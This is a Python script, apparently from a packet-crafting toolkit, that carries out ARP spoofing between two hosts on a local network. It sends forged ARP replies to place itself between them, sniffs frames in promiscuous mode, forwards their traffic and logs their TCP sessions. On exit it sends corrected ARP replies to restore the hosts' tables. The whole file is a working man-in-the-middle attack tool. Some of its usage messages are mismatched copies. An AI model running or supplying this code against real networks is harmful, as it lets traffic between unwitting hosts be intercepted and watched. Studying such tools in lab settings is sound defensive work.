#!/usr/bin/env python3

'''Script for ARP spoofing'''

import time, os, sys
from framebuilder import defs, eth, ipv4, tcp, tools

if len(sys.argv) < 6:
    print('Missing arguments')
    print(f'Usage: {sys.argv[0]} interface left_ip left_mac right_ip right_mac')
    sys.exit(1)

if not tools.is_valid_ipv4_address(sys.argv[2]):
    print(f'Invalid IP address: {sys.argv[2]}')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if not tools.is_valid_ipv4_address(sys.argv[4]):
    print(f'Invalid IP address: {sys.argv[4]}')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if not tools.is_valid_mac_address(sys.argv[3]):
    print(f'Invalid MAC address: {sys.argv[3]}')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if not tools.is_valid_mac_address(sys.argv[5]):
    print(f'Invalid MAC address: {sys.argv[5]}')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if_name = sys.argv[1]
os.system(f'sysctl -w net.ipv4.conf.{if_name}.forwarding=0 &>/dev/null')

my_ip = tools.get_if_ipv4_addr(if_name)
if my_ip is None:
    print(f'Could not find IP address of interface {sys.argv[1]}')
    sys.exit(1)
my_mac = tools.get_mac_addr(if_name)

interval = 10**9
left_ip = sys.argv[2]
left_mac = sys.argv[3]
right_ip = sys.argv[4]
right_mac = sys.argv[5]
connections = []

tools.print_rgb('--- ARP spoofer ---',
        rgb=(200, 200, 200), bold=True)
tools.print_rgb(f'pretend {left_ip} and {right_ip} to be at {my_mac}',
        rgb=(200, 0, 0), bold=True)

arp_data_left = {'operation': 2,
        'src_addr': my_mac,
        'dst_addr': left_mac,
        'snd_hw_addr': my_mac,
        'snd_ip_addr': right_ip,
        'tgt_hw_addr': my_mac,
        'tgt_ip_addr': right_ip}

arp_msg_left = eth.ArpMessage(arp_data_left)

arp_data_right = {'operation': 2,
        'src_addr': my_mac,
        'dst_addr': right_mac,
        'snd_hw_addr': my_mac,
        'snd_ip_addr': left_ip,
        'tgt_hw_addr': my_mac,
        'tgt_ip_addr': left_ip}

arp_msg_right = eth.ArpMessage(arp_data_right)

eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=left_mac, block=0)
# current time
ctime = 0

try:
    while True:
        if time.time_ns() >= ctime + interval or ctime == 0:
            arp_msg_right.send(eth_handler.socket)
            arp_msg_left.send(eth_handler.socket)
            ctime = time.time_ns()
        frame, frame_type = eth_handler.receive(promisc=True)
        
        # don't process frames that we have sent ourselves (frame_type 4)
        if frame is not None and frame_type != 4:
            ip_pk = ipv4.IPv4Packet.from_frame(frame)
            conditions  = [ip_pk.src_addr == left_ip,
                    ip_pk.dst_addr == left_ip,
                    ip_pk.src_addr == right_ip,
                    ip_pk.dst_addr == right_ip]
            if any(conditions):
                # forward frames to their real destination
                if frame.src_addr == right_mac and ip_pk.dst_addr != my_ip:
                    eth_handler.remote_mac = left_mac
                    eth_handler.send(ip_pk)
                if frame.src_addr == left_mac and ip_pk.dst_addr != my_ip:
                    eth_handler.remote_mac = right_mac
                    eth_handler.send(ip_pk)
                # capture and print TCP connection data
                if ip_pk.protocol == 6:
                    tcp_seg = tcp.TCPSegment.from_packet(ip_pk)
                    conn_tuple = (ip_pk.src_addr, tcp_seg.src_port,
                                  ip_pk.dst_addr, tcp_seg.dst_port)
                    if conn_tuple not in connections:
                        l_str = f'{conn_tuple[0]}:{conn_tuple[1]}'
                        r_str = f'{conn_tuple[2]}:{conn_tuple[3]}'
                        reverse_tupel = (conn_tuple[2], 
                                         conn_tuple[3], 
                                         conn_tuple[0], 
                                         conn_tuple[1])
                        color = (100, 200, 100)
                        if reverse_tupel in connections:
                            color = (100, 100, 100)
                        tools.print_rgb(f'TCP SESSION: {l_str} <-> {r_str}',
                                rgb=color, bold=True, end='')
                        if tcp_seg.syn == 1:
                            tools.print_rgb(' SYN', rgb=(10, 200, 10), 
                                    bold=True, end='')
                        if tcp_seg.rst == 1:
                            tools.print_rgb(' RST', rgb=(200, 10, 10), 
                                    bold=True, end='')
                        if tcp_seg.fin == 1:
                            tools.print_rgb(' FIN', rgb=(200, 100, 100), 
                                    bold=True, end='')
                        if tcp_seg.ack == 1:
                            tools.print_rgb(' ACK', rgb=(100, 100, 100), 
                                    bold=True, end='')
                        print()
                        connections.append(conn_tuple)
except KeyboardInterrupt: 
    tools.print_rgb('Ctrl-C -- Handing connections over...',
            rgb=(200, 0, 0), bold=True, end='')
    arp_data_left = {'operation': 2,
            'src_addr': my_mac,
            'dst_addr': left_mac,
            'snd_hw_addr': right_mac,
            'snd_ip_addr': right_ip,
            'tgt_hw_addr': right_mac,
            'tgt_ip_addr': right_ip}

    arp_msg_left = eth.ArpMessage(arp_data_left)

    arp_data_right = {'operation': 2,
            'src_addr': my_mac,
            'dst_addr': right_mac,
            'snd_hw_addr': left_mac,
            'snd_ip_addr': left_ip,
            'tgt_hw_addr': left_mac,
            'tgt_ip_addr': left_ip}

    arp_msg_right = eth.ArpMessage(arp_data_right)
    for i in range(3): 
        arp_msg_right.send(eth_handler.socket)
        arp_msg_left.send(eth_handler.socket)
        time.sleep(0.1)
    tools.print_rgb('Done. Bye!',
            rgb=(200, 0, 0), bold=True)
